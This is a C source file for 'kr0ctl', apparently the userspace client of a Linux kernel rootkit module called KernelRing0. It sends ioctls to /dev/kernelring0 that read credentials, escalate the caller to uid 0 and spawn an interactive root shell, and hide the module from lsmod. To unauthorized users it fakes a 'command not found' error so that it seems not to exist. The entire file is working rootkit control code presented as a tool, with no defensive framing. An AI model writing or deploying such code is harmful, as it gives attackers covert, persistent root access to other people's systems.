// SPDX-License-Identifier: GPL-2.0
/*
 * kr0ctl.c - KernelRing0 control utility
 *
 * Commands:
 *   status  read the current process credentials through the module
 *   root    escalate the current process to uid=0 and exec a shell
 *   hide    ask the module to remove itself from the module list
 *
 * If the caller is not authorized (or the device does not exist),
 * every command prints "command not found" and exits 127, so the
 * tool appears nonexistent to unauthorized users.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>

#define DEV_PATH "/dev/kernelring0"
#define KR0_MAGIC 'K'

struct kr0_cred_info {
    int pid;
    int tgid;
    unsigned int uid;
    unsigned int euid;
    unsigned int gid;
    unsigned int egid;
    char comm[16];
};

#define KR0_ESCALATE    _IOW(KR0_MAGIC, 1, int)
#define KR0_READ_CRED   _IOR(KR0_MAGIC, 2, struct kr0_cred_info)
#define KR0_HIDE        _IO (KR0_MAGIC, 3)

static void not_found_exit(void)
{
    fprintf(stderr, "kr0ctl: command not found\n");
    exit(127);
}

static int open_dev(void)
{
    int fd = open(DEV_PATH, O_RDWR);

    if (fd < 0)
        not_found_exit();
    return fd;
}

static int do_ioctl(int fd, unsigned long req, void *arg)
{
    int ret = ioctl(fd, req, arg);

    if (ret < 0) {
        if (errno == ENOENT || errno == EACCES || errno == EPERM)
            not_found_exit();
        fprintf(stderr, "kr0ctl: ioctl failed: %s\n", strerror(errno));
        exit(1);
    }
    return ret;
}

static int cmd_status(void)
{
    int fd = open_dev();
    struct kr0_cred_info info;

    do_ioctl(fd, KR0_READ_CRED, &info);

    printf("pid=%d tgid=%d uid=%u euid=%u gid=%u egid=%u comm=%s\n",
           info.pid, info.tgid, info.uid, info.euid,
           info.gid, info.egid, info.comm);

    close(fd);
    return 0;
}

static int cmd_root(void)
{
    int fd = open_dev();

    do_ioctl(fd, KR0_ESCALATE, NULL);
    close(fd);

    fprintf(stderr, "kr0ctl: escalated, spawning root shell...\n");
    execl("/bin/sh", "sh", "-i", NULL);

    fprintf(stderr, "kr0ctl: execl(/bin/sh) failed: %s\n", strerror(errno));
    return 1;
}

static int cmd_hide(void)
{
    int fd = open_dev();

    do_ioctl(fd, KR0_HIDE, NULL);
    close(fd);

    printf("kr0ctl: hide requested, check 'lsmod | grep kernelring0'\n");
    return 0;
}

static void usage(const char *prog)
{
    fprintf(stderr,
        "Usage: %s <command>\n"
        "Commands:\n"
        "  status   print current process credentials via the module\n"
        "  root     escalate this process to uid=0 and exec a shell\n"
        "  hide     remove the module from lsmod (ring0 hide)\n",
        prog);
}

int main(int argc, char **argv)
{
    if (argc != 2) {
        usage(argv[0]);
        return 1;
    }
    if (!strcmp(argv[1], "status")) return cmd_status();
    if (!strcmp(argv[1], "root"))   return cmd_root();
    if (!strcmp(argv[1], "hide"))   return cmd_hide();

    usage(argv[0]);
    return 1;
}